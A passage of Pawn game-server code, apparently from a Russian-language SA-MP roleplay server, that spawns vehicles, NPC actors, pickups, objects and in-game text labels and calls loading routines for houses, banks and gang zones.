	AddStaticVehicleEx(481,1580.2460,688.956726,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,687.704040,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,686.451354,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,685.198669,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,683.945983,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,682.693298,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,681.440612,10.2229,267.1944,-1,-1,60);
	AddStaticVehicleEx(481,1580.2460,680.187927,10.2229,267.1944,-1,-1,60);
	
	AddStaticVehicleEx(481,1698.2147,1437.877929,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1435.855468,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1433.833007,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1431.810546,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1429.788085,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1427.765625,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1425.743164,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1423.720703,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1421.698242,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1419.675781,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1417.653320,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1415.630859,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1413.608398,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1411.585937,10.1907,269.3124,-1,-1,60);
	AddStaticVehicleEx(481,1698.2147,1409.563476,10.1907,269.3124,-1,-1,60);
	
	AddStaticVehicleEx(481,2206.749023,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2208.001708,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2209.254394,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2210.507080,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2211.759765,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2213.012451,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2214.265136,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2215.517822,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2216.770507,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2218.023193,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2219.275878,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2220.528564,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2221.781250,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2223.033935,1815.2753,10.2741,3.4573,-1,-1,60);
	AddStaticVehicleEx(481,2224.286621,1815.2753,10.2741,3.4573,-1,-1,60);
	
	AddStaticVehicleEx(481,2834.4780,1263.054687,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1264.307373,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1265.560058,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1266.812744,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1268.065429,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1269.318115,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1270.570800,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1271.823486,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1273.076171,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1274.328857,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1275.581542,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1276.834228,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1278.086914,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1279.339599,10.2367,88.5931,-1,-1,60);
	AddStaticVehicleEx(481,2834.4780,1280.592285,10.2367,88.5931,-1,-1,60);
	
	AddStaticVehicleEx(481,-1281.656616,2696.501220,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1282.322875,2697.498535,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1282.989135,2698.495849,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1283.655395,2699.493164,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1284.321655,2700.490478,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1284.987915,2701.487792,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1285.654174,2702.485107,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1286.320434,2703.482421,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1286.986694,2704.479736,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1287.652954,2705.477050,49.5192,118.6227,-1,-1,60);
	AddStaticVehicleEx(481,-1288.319213,2706.474365,49.5192,118.6227,-1,-1,60);


    AddStaticVehicleEx(481,1078.65,1365.8022,10.2882,357.0522,3,3,60);
//	// AddStaticVehicleEx(481,-487.7894,-556.598,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,110.355,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1080.08,1365.8022,10.2882,357.0522,3,3,60);
//	// AddStaticVehicleEx(481,-487.7894,-558.217,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,108.597,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1081.51,1365.8022,10.2882,357.0522,3,3,60);
//	// AddStaticVehicleEx(481,-487.7894,-559.836,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,106.84,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1082.95,1365.8022,10.2882,357.0522,3,3,60);
//	// AddStaticVehicleEx(481,-487.7894,-561.455,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,105.082,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1084.38,1365.8022,10.2882,357.0522,3,3,60);
	// AddStaticVehicleEx(481,-487.7894,-563.074,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,103.325,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1085.81,1365.8022,10.2882,357.0522,3,3,60);
	// AddStaticVehicleEx(481,-487.7894,-564.693,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,101.567,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1087.24,1365.8022,10.2882,357.0522,3,3,60);
	// AddStaticVehicleEx(481,-487.7894,-566.312,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,99.8096,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1088.68,1365.8022,10.2882,357.0522,3,3,60);
	// AddStaticVehicleEx(481,-487.7894,-567.931,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,98.0521,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1090.11,1365.8022,10.2882,357.0522,3,3,60);
	// AddStaticVehicleEx(481,-487.7894,-569.55,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,96.2946,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1091.54,1365.8022,10.2882,357.0522,3,3,60);
	// AddStaticVehicleEx(481,-487.7894,-571.169,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,94.5371,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,1092.97,1365.8022,10.2882,357.0522,3,3,60);
	// AddStaticVehicleEx(481,-487.7894,-572.788,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,92.7796,-292.7971,1.0274,352.4403,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-556.598022,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-554.979004,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-553.359985,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-551.740967,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-550.121948,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-548.502930,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-546.883911,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-545.264893,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-543.645874,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-542.026855,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-540.407837,24.9908,90.2740,3,3,60);
	AddStaticVehicleEx(481,-487.7894,-538.788818,24.9908,90.2740,3,3,60);






	///SetDynamicObjectMaterial(tmpobjid,
	



	///

	///////////////////////

	
	///
	CreateDynamicObject(1340, 2219.47, 1851.45, 10.82, 0.00, 0.00, -91.50);
	CreateDynamicObject(1340, 2838.19, 1263.24, 11.44, 0.00, 0.00, -179.90);
	CreateDynamicObject(1340, 1702.08, 1406.21, 10.68, 0.00, 0.00, 94.20);
	
	KTrenag[0] = CreateDynamicObject(2913, 774.354431,1.900340,1000.605163, 90.000038,0.999999,-0.900000,1);
	KTrenag[1] = CreateDynamicObject(2915, 771.865661,5.590106,999.889953, 0.000000,-1.000000,91.299919,1);
	KTrenag[2] = CreateDynamicObject(2913, 774.354431,1.900340,1000.605163, 90.000038,0.999999,-0.900000,2);
	KTrenag[3] = CreateDynamicObject(2915, 771.865661,5.590106,999.889953, 0.000000,-1.000000,91.299919,2);
//	CreateDynamicObject(1340, 1771.77, -1904.29, 13.58, 0.00, 0.00, 90.59);
//	CreateDynamicObject(1340, 1437.27, -2292.70, 13.62, 0.00, 0.00, 90.09);
    CreateDynamicActor(111,1773.1392,-1890.5740,13.5515,137.8204);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1773.1392,-1890.5740,14.5515,10.0, 0,1);
	
	CreateDynamicActor(111,1243.0975,-1704.3528,13.5469,185.5926);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1243.0975,-1704.3528,14.5469,10.0, 0,1);
	
	CreateDynamicActor(111,1436.8009,-2281.8413,13.5469,203.2843);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1436.8009,-2281.8413,14.5469,10.0, 0,1);


	CreateDynamicActor(111,1689.5300,1461.6190,10.7678,182.8480);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1689.5300,1461.6190,11.7678,10.0, 0,1);
	
	CreateDynamicActor(111,2839.2483,1294.7343,11.3906,211.5021);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,2839.2483,1294.7343,12.3906,10.0, 0,1);
	
	CreateDynamicActor(111,2222.5676,1829.2949,10.8203,4.2616);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,2222.5676,1829.2949,11.8203,10.0, 0,1);

//	new actc;
//	actc =
	CreateDynamicActor(11,1969.7750,1017.4728,992.4688,269.6573,1,100.0,1,10);
//	SetActorVirtualWorld(actc,1);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1969.7750,1017.4728,993.4688,10.0, 1,1);
	Create3DTextLabelEx( "Ставка: {f7ae11}1000$", -1,1962.19714, 1010.02173, 992.96722,10.0, 1,1);
	Create3DTextLabelEx( "Ставка: {f7ae11}10000$", -1,1962.19714, 1018.12152, 992.96722,10.0, 1,1);
	Create3DTextLabelEx( "Ставка: {f7ae11}100000$", -1,1962.19714, 1026.22131, 992.96722,10.0, 1,1);
//	actc =
	CreateDynamicActor(171,1960.8945,1010.0126,992.4688,270.9890,1,100.0,1,10);
//	SetActorVirtualWorld(actc,1);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1960.8945,1010.0126,993.4688,10.0, 1,1);
	//actc =
	CreateDynamicActor(172,1960.8938,1018.1450,992.4688,272.526,1,100.0,1,10);
//	SetActorVirtualWorld(actc,1);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1960.8938,1018.1450,993.4688,10.0, 1,1);
//	actc =
	CreateDynamicActor(11,1960.8947,1026.2284,992.4688,267.9129,1,100.0,1,10);
//	SetActorVirtualWorld(actc,1);
	Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1960.8947,1026.2284,993.4688,10.0, 1,1);
	PoliceBot[0] = CreateDynamicActor(300,1987.2416,1352.9572,1015.4606,2.3077,1,100.0,1);
//	SetActorVirtualWorld(PoliceBot[0],1);
	PoliceText[0] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1987.2416,1352.9572,1016.4606,10.0, 1,1);
	PoliceBot[1] = CreateDynamicActor(300,1987.2416,1352.9572,1015.4606,2.3077,1,100.0,17);
//	SetActorVirtualWorld(PoliceBot[1],2);
	PoliceText[1] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1987.2416,1352.9572,1016.4606,10.0, 17,1);
	
	RolikBot = CreateDynamicActor(52,1478.9521,-1665.4988,13.9901,179.5885);
	RolikText = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1478.9521,-1665.4988,14.9901,10.0, 0,1);
	
	Create3DTextLabelEx( "Прокат роликов\nЦена: {f7ae11}50$ за 15 минут", -1,969.7739,2361.3352,12.3410,10.0, 0,1);
	
	
/*	ProdBot[0] = CreateDynamicActor(111,-636.0065,1447.8339,13.6827,174.3767);
	ProdText1[0] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,-636.0065,1447.8339,14.6827,10.0, 0,1);
	ProdBot[1] = CreateDynamicActor(223,-1661.9115,2544.4556,85.5599,67.4482);
	ProdText1[1] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,-1661.9115,2544.4556,86.5599,10.0, 0,1);*/
	
	BursirBot = CreateDynamicActor(50,1658.2246,2200.2646,10.8203,179.1386);
	BursirText = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1658.2246,2200.2646,11.8203,10.0, 0,1);
	

	
	UtilBot = CreateDynamicActor(8,134.3091,2634.1489,16.4893,186.2695);
	UtilText = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,134.3091,2634.1489,17.4893,10.0, 0,1);
	
	
	static Float:HDPos[6][4] = {
		{2219.4414,1852.4694,10.8203,184.0687},
		{2839.2085,1263.3600,11.3906,91.9166},
		{1702.1257,1405.2000,10.6738,2.7515},
		{1771.8260,-1905.7450,13.5541,354.1636},
		{1437.2568,-2293.9343,13.5469,354.6864},
		{1224.4329,-1699.2007,13.5469,185.8618}
	};
	
	for(new i = 0;i < 6; i++)
	{
	    HotDogBot[i] = CreateDynamicActor(168,HDPos[i][0],HDPos[i][1],HDPos[i][2],HDPos[i][3]);
		HotDogText[i] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,HDPos[i][0],HDPos[i][1],HDPos[i][2]+1,10.0, 0);
		dogsp[i] = CreateDynamicSphere(HDPos[i][0],HDPos[i][1],HDPos[i][2], 5.0);
	}
	
/*	HotDogBot[0] = CreateDynamicActor(168,2219.4414,1852.4694,10.8203,184.0687);
	HotDogText[0] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,2219.4414,1852.4694,11.8203,10.0, 0);
	dogsp[0] = CreateDynamicSphere(2219.4414,1852.4694,10.8203, 5.0);
	
	HotDogBot[1] = CreateDynamicActor(168,2839.2085,1263.3600,11.3906,91.9166);
	HotDogText[1] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,2839.2085,1263.3600,12.3906,10.0, 0);
	dogsp[1] = CreateDynamicSphere(2839.2085,1263.3600,11.3906, 5.0);
	
	HotDogBot[2] = CreateDynamicActor(168,1702.1257,1405.2000,10.6738,2.7515);
	HotDogText[2] = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H", -1,1702.1257,1405.2000,11.6738,10.0, 0);
	dogsp[2] = CreateDynamicSphere(1702.1257,1405.2000,10.6738, 5.0);*/
	
	armytext = Create3DTextLabelEx( "-", -1,153.9975,1879.2290,20.0805,10.0, 0,1);
    CreateDynamicObjectEx(1340, 1771.77, -1904.29, 13.58, 0.00, 0.00, 90.59);
	CreateDynamicObjectEx(1340, 1437.27, -2292.70, 13.62, 0.00, 0.00, 90.09);
	CreateDynamicObjectEx(1340, 1224.46, -1700.21, 13.56, 0.00, 0.00, -90.00);
	
/*	HotDogBot[3] = CreateActor(168,1771.8260,-1905.7450,13.5541,354.1636);
	HotDogText[3] = Create3DTextLabel( "Взамодействие {f7ae11}H", -1,1771.8260,-1905.7450,14.5541,10.0, 0);
	dogsp[3] = CreateDynamicSphere(1771.8260,-1905.7450,13.5541, 5.0);
	
	HotDogBot[4] = CreateActor(168,1437.2568,-2293.9343,13.5469,354.6864);
	HotDogText[4] = Create3DTextLabel( "Взамодействие {f7ae11}H", -1,1437.2568,-2293.9343,14.5469,10.0, 0);
	dogsp[4] = CreateDynamicSphere(1437.2568,-2293.9343,13.5469, 5.0);
	
	HotDogBot[5] = CreateActor(168,1224.4329,-1699.2007,13.5469,185.8618);
	HotDogText[5] = Create3DTextLabel( "Взамодействие {f7ae11}H", -1,1224.4329,-1699.2007,14.5469,10.0, 0);
	dogsp[5] = CreateDynamicSphere(1224.4329,-1699.2007,13.5469, 5.0);*/
	
 //   lspd[0]= CreateDynamicObject(968,1544.70789, -1630.89185, 13.03080,   0.00000, 89.00000, 90.00000);
    
	//Objects////////////////////////////////////////////////////////////////////////////////////////////////////////

	//jsls
	//ash
 	SpPes = CreateDynamicCube(-1382, 2654.5,0,-1208, 2760.5, 2000);
 	SpGruz = CreateDynamicCube(1570, 653.5,0,1771, 796.5, 2000);
	///

	LoadMats();
	LoadHouse();
	/// =====

	//=======
	LoadAC();
	LoadGraf();
	UpdateArmy();
	LoadGZ();
	LoadCJ();
	new days,mon,yer;
 	getdate(yer,mon,days);
	DayCheck = days;
	Inta = CreateMenu(" ", 1, 0.0, 160.0, 50.0);
    SetMenuColumnHeader(Inta, 0, "~r~MENU");
	AddMenuItem(Inta,0,"NEXT");
	AddMenuItem(Inta,0,"BACK");
	AddMenuItem(Inta,0,"SELECT");
 
	SetTimer("UpdateBar", 500, 1);



	//LoadKv();
	//LoadPd();
	Paydah=ghour;
	

   // CreateObject(19464, 2215.97, -1142.56, 1024.90, 0.00, -89.99, 0.00);
	//Zavod

	//hotel

	//Pol

	
	
	//
	//



	
	// SAFE
	
	CreateDynamicObject(2332, -37.76, -57.63, 1002.91, 0.00, 0.00, 90.59);
	CreateDynamicObject(2332, 204.37621, -99.36540, 1004.71143,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 163.44460, -80.00951, 1001.23029,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2332, 820.14, 8.41, 1003.54, 0.00, 0.00, 90.20);
	CreateDynamicObject(2332, 382.30, -56.51, 1000.88, 0.00, 0.00, 0.00);
	CreateDynamicObject(2332, 372.48, -4.25, 1001.19, 0.00, 0.00, -90.49);
	CreateDynamicObject(2332, 200.05, -10.61, 1000.57, 0.00, 0.00, 0.49);
	CreateDynamicObject(2332, 495.32, -80.62, 998.12, 0.00, 0.00, -89.90);
	CreateDynamicObject(2332, 380.28, -116.27, 1000.87, 0.00, 0.00, -90.09);
	CreateDynamicObject(2332, 1213.96, -16.40, 1000.30, 0.00, 0.00, 179.90);
	CreateDynamicObject(2332, 503.59, -24.17, 1000.03, 0.00, 0.00, -90.09);
	CreateDynamicObject(2332, -778.80, 498.17, 1371.10, 0.00, 0.00, -90.70);
	CreateDynamicObject(2332, 408.61270, -55.82900, 1001.30682,   0.00000, 0.00000, 180.00000);

	/// ZAKRITOEV ATEL'E

	CreateDynamicObject(4848, 2068.08032, -1830.72119, 1.69600,   360.00000, 90.00000, 0.00000);
	CreateDynamicObject(4848, 488.26080, -1738.20740, 0.57623,   0.00000, 90.00000, 81.97717);
	CreateDynamicObject(4848, 1044.08411, -1022.50928, 20.06999,   0.00000, 90.00000, -90.00000);
	CreateDynamicObject(4848, 1027.62012, -1025.93762, 20.06999,   0.00000, 90.00000, -90.00000);
	////
    saveacc = GetTickCount()+900000;
    new kek = 2400 + random(1200);
    koleso = gettime()+kek;
	turpic[0] = CreateDynamicPickup(1318,23,-5.0335,-14.2644,1999.5859,1); //прогулка внутри
	turpic[1] = CreateDynamicPickup(1318,23,211.5985,1360.0671,10.5859,0); //прогулка снаружи
	turpic[2] = CreateDynamicPickup(1318,23,-0.0919,1.3074,1999.5859,1); //вход внутри
	turpic[3] = CreateDynamicPickup(1318,23,243.8960,1418.6943,10.5707,0); //вход снаружи
	regpic[0] = CreateDynamicPickup(1318,23,1629.2667,972.0903,10.8203,0);
	regpic[1] = CreateDynamicPickup(1318,23,-2158.6282,643.1423,1052.3750,1);
	regpic[2] = CreateDynamicPickup(19131,23,-2161.1267,640.4461,1052.3817,1);
	
	regpic1[0] = CreateDynamicPickup(1318,23,2186.9233,1113.3695,12.6538,0);
	regpic1[1] = CreateDynamicPickup(1318,23,-2158.6282,643.1423,1052.3750,2);
	regpic1[2] = CreateDynamicPickup(19131,23,-2161.1267,640.4461,1052.3817,2);
	//
	MedicBot = CreateDynamicActor(153,2568.4177,-1281.8112,1044.1250,181.9994,1,100.0,1);
//	SetActorVirtualWorld(MedicBot,1);
	MedicText = Create3DTextLabelEx( "-",0xC2C2C220,2568.4177,-1281.8112,1045.1250,10.0, 1, 1 );
	
	
	
	
	medicpic = CreateDynamicPickup(1275,23,2568.4636,-1283.1464,1044.1250,1);
	medicpic1[0] = CreateDynamicPickup(19135,23,2550.8755,-1302.3335,1044.1250,1);
	medicpic1[1] = CreateDynamicPickup(19135,23,2550.8711,-1285.1146,1044.1250,1);
	hospic = CreateDynamicPickup(1240,23,1391.5013,-53.5941,1000.9153,2);
	picvz = CreateDynamicPickup(1240,23,2564.3335,-1293.0745,1044.1250,1);
	

	
	hostext = CreateDynamic3DTextLabel("-",0xC2C2C220,1391.5013,-53.5941,1000.9153+1,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, 2);
	
	hostext1 = Create3DTextLabelEx( "-",0xC2C2C220,2564.3335,-1293.0745,1044.1250+1,10.0, 1, 1 );
	UpdAp(); UpdAp1();
	CreateDynamicObject(19817, 1545.00, -1609.75, 12.33, 0.00, 0.00, 89.00);
	LoadBank();
//	NarkText1 = Create3DTextLabelEx("1",0xFFFFFFFF,727.9343,9.9842,1000.6981,15,1,1);
//	UpdNark();
	NarkBot = CreateDynamicActor(30,1049.8925,2922.6387,1051.8601,180.7852,1,100.0,1);
//	SetActorVirtualWorld(NarkBot,1);
	
	ArmyEat = CreateDynamicActor(205,450.3987,-82.2322,999.5547,183.4433,1,100.0,10);
//	SetActorVirtualWorld(ArmyEat,10);
	ArmyEatText = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,450.3987,-82.2322,1000.5547,10.0, 10, 0 );
	NarkText = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,1049.8925,2922.6387,1052.8601,10.0, 1, 0 );
	ProdText = Create3DTextLabelEx("1",0xFFFFFFFF,1712.2064,719.5007,14.7680,15,0,1);
	UpdProd();
	CreateDynamicObject(1569, 1444.60, -1778.28, 32.27, 0.00, 0.00, 0.00);
	narkopic[0] = CreateDynamicPickup(1318,23,1048.7448,2910.1699,47.8231,0);
	narkopic[1] = CreateDynamicPickup(1318,23,1047.5529,2914.5571,1051.8601,1);
   // LicBot = CreateDynamicActor(171,1724.3496,-1343.2271,1569.0170,204.3869,1,100.0,1);
//    SetActorVirtualWorld(LicBot,1);
  //  LicText = Create3DTextLabelEx( "Взаимодействие: {f7ae11}H",-1,1724.3496,-1343.2271,1570.0170,10.0, 1, 0 );
   // Create3DTextLabelEx( "{FFFFFF}Используйте: {f7ae11}/tuning", -1,2531.1912,-1535.5282,24.0067,10.0, 0, 0 );
    Create3DTextLabelEx( "{FFFFFF}Используйте: {f7ae11}/tuning", -1,2309.8481,1795.1025,10.8203,10.0, 0, 0 );
    Create3DTextLabelEx( "{FFFFFF}LowRide Battle\nИспользуйте: {f7ae11}/lowride", -1,1067.2545,1758.1206,10.8203,10.0, 0, 0 );
 //   Create3DTextLabelEx( "{FFFFFF}Компьютер\nИспользуйте: {f7ae11}H", -1,2015.3682,1385.2762,3017.1025,10.0, 1, F_LVPD );
  //  Create3DTextLabelEx( "{FFFFFF}Компьютер\nИспользуйте: {f7ae11}H", -1,2015.3682,1385.2762,3017.1025,10.0, 1, F_LSPD );
	//
	CreateDynamic3DTextLabel("{f7ae11}[Компьютер]{FFFFFF}\nИспользуйте: {f7ae11}H",-1, 2015.3682,1385.2762,3017.1025,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1, SpawnIn[1][1],SpawnIn[1][0] );
    CreateDynamic3DTextLabel("{f7ae11}[Компьютер]{FFFFFF}\nИспользуйте: {f7ae11}H",-1, 2015.3682,1385.2762,3017.1025,10.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID, 1, SpawnIn[16][1],SpawnIn[16][0] );
	//
 	//

 

	//
//    lspd[1] = CreateDynamicObject(980, 1587.73840, -1638.04297, 14.73610,   0.00000, 0.00000, 0.00000);
   // CreateObject(970, 1544.69788, -1620.56201, 12.98310,   0.00000, 0.00000, 90.00000);
	//CreateObject(970, 1544.77209, -1635.04822, 12.98310,   0.00000, 0.00000, 90.00000);
    pered = CreateDynamicPickup(1275,23,1584.0472,705.2065,10.7680,0);
    zavodpic  = CreateDynamicPickup(2061,23,2181.2549,1578.9573,999.9712,15);
    
	gunpic[0] = CreateDynamicPickup(348,23,290.3426,-109.6755,1001.5156,1);
	
	gunpic[1] = CreateDynamicPickup(348,23,1410.2902,-44.3784,1000.9143,55);
	
	gunpic[2] = CreateDynamicPickup(348,23,290.3426,-109.6755,1001.5156,11);
	
	gunpic[3] = CreateDynamicPickup(348,23,1481.1973,-1064.6665,1025.0059,2);
	
	gunpic[4] = CreateDynamicPickup(348,23,1984.4214,1373.9895,2015.4706,1);
	
	gunpic[5] = CreateDynamicPickup(348,23,1984.4214,1373.9895,2015.4706,17);
	
	gunpic[6] = CreateDynamicPickup(348,23,1373.2361,-40.0045,1000.9143,66);
	checkmap[0] = CreateDynamicSphere(-194.25, 93.10, -25.66, 2.0);
	checkmap[1] = CreateDynamicSphere(2771.35, -69.61, 1318.71, 2.0);
	pickmeria[0] = CreateDynamicPickup(1318,23,1406.7236,-28.1709,1000.9153,55);
	pickmeria[1] = CreateDynamicPickup(1318,23,995.1729,1089.3896,2997.7656,90);
	pickmeria[2] = CreateDynamicPickup(1318,23,1445.3757,-1777.8651,33.4297,0);
	pickmeria[3] = CreateDynamicPickup(1318,23,1398.0602,-38.1964,1000.9153,54);
	armygunsp = CreateDynamicSphere(290.3426,-109.6755,1001.5156, 2.0,11);
	


    CreateDynamicPickup(2061,23,130.5404,1816.1713,17.6406,0);
    CreateDynamicPickup(2061,23,119.3942,1816.1692,17.6406,0);
    CreateDynamicPickup(2061,23,139.7556,1816.1726,17.6406,0);
    CreateDynamicPickup(2061,23,108.1302,1890.4716,18.2689,0);
    CreateDynamicPickup(2061,23,153.6109,1932.3772,18.9599,0);
	armylichsp[0] = CreateDynamicSphere(130.5404,1816.1713,17.6406, 2.0,0);
	armylichsp[1] = CreateDynamicSphere(119.3942,1816.1692,17.6406, 2.0,0);
	armylichsp[2] = CreateDynamicSphere(139.7556,1816.1726,17.6406, 2.0,0);
	armylichsp[3] = CreateDynamicSphere(108.1302,1890.4716,18.2689, 2.0,0);
	armylichsp[4] = CreateDynamicSphere(153.6109,1932.3772,18.9599, 2.0,0);
	
 	CreateDynamicObject(1498, 299.48, 312.05, 998.16, 0.00, 0.00, 0.00);

	TextOrg[F_GROVE-6] = CreateDynamic3DTextLabel("1",0xFFFFFFFF,-191.1655,96.4780,-25.6751,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, F_GROVE);
 	FracPic[F_GROVE-6] = CreateDynamicPickup(1279,23,-191.1655,96.4780,-26.6751,F_GROVE);
    TextOrg[F_BALLAS-6] = CreateDynamic3DTextLabel("1",0xFFFFFFFF,-191.1655,96.4780,-25.6751,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, F_BALLAS);
 	FracPic[F_BALLAS-6] = CreateDynamicPickup(1279,23,-191.1655,96.4780,-26.6751,F_BALLAS);
 	TextOrg[F_BIKERS-6] = CreateDynamic3DTextLabel("1",0xFFFFFFFF,2817.3611,-1167.6019,1030.1719,15.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1, F_BIKERS);
